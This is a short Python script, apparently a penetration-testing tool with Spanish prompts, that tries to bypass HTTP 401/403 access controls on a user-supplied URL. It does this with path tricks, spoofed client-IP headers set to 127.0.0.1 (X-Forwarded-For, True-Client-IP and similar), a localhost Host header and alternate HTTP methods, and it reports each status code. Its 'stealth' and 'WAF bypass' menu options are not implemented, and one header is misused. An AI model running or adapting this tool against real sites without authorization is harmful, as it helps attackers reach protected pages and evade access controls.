import requests

cabecera = {'Host': 'localhost'}
cabecera1 = {'X-Originating-IP': '127.0.0.1'}
cabecera2 = {'X-Forwarded-For': '127.0.0.1'}
cabecera3 = {'X-Forwarded': '127.0.0.1'}
cabecera4 = {'Forwarded-For': '127.0.0.1'}
cabecera5 = {'X-Remote-IP': '127.0.0.1'}
cabecera6 = {'X-Remote-Addr': '127.0.0.1'}
cabecera7 = {'X-ProxyUser-Ip': '127.0.0.1'}
cabecera8 = {'X-Original-URL': '127.0.0.1'}
cabecera9 = {'Client-IP': '127.0.0.1'}
cabecera10 = {'True-Client-IP': '127.0.0.1'}
cabecera11 = {'Cluster-Client-IP': '127.0.0.1'}
cabecera12 = {'X-ProxyUser-Ip': '127.0.0.1'}

main_question = input('Que quieres testear: [1] 401,403 Bypass [2] Modo sigiloso [3] WAF Bypass: ')

if main_question == '1':
    user_input = input("Write the URL please: ") #www.example.com

    resp = requests.get('https://' + user_input)
    print('El código es ' + str(resp.status_code))

    resp1 = requests.get('https://' + user_input + '/')
    print('El código es ' + str(resp1.status_code))

    resp2 = requests.get('https://' + user_input + '/.')
    print('El código es ' + str(resp2.status_code))

    resp3 = requests.get('https://' + user_input + '//')
    print('El código es ' + str(resp3.status_code))

    resp4 = requests.get('https://' + user_input, headers=cabecera)
    print('El código es ' + str(resp4.status_code))

    resp5 = requests.get('https://' + user_input, headers=cabecera1)
    print('El código es ' + str(resp5.status_code))

    resp6 = requests.get('https://' + user_input, headers=cabecera2)
    print('El código es ' + str(resp6.status_code))

    resp7 = requests.get('https://' + user_input, headers=cabecera3)
    print('El código es ' + str(resp7.status_code))

    resp8 = requests.get('https://' + user_input, headers=cabecera4)
    print('El código es ' + str(resp8.status_code))

    resp9 = requests.get('https://' + user_input, headers=cabecera5)
    print('El código es ' + str(resp9.status_code))

    resp10 = requests.get('https://' + user_input, headers=cabecera6)
    print('El código es ' + str(resp10.status_code))

    resp11 = requests.get('https://' + user_input, headers=cabecera7)
    print('El código es ' + str(resp11.status_code))

    resp12 = requests.get('https://' + user_input, headers=cabecera8)
    print('El código es ' + str(resp12.status_code))

    resp13 = requests.get('https://' + user_input, headers=cabecera9)
    print('El código es ' + str(resp13.status_code))

    resp14 = requests.get('https://' + user_input, headers=cabecera10)
    print('El código es ' + str(resp14.status_code))

    resp15 = requests.get('https://' + user_input, headers=cabecera11)
    print('El código es ' + str(resp15.status_code))

    resp16 = requests.get('https://' + user_input, headers=cabecera12)
    print('El código es ' + str(resp16.status_code))

    resp17 = requests.head('https://' + user_input)
    print('El código es ' + str(resp17.status_code))

    resp18 = requests.patch('https://' + user_input)
    print('El código es ' + str(resp18.status_code))

    resp19 = requests.put('https://' + user_input)
    print('El código es ' + str(resp19.status_code))

    resp20 = requests.options('https://' + user_input)
    print('El código es ' + str(resp20.status_code))













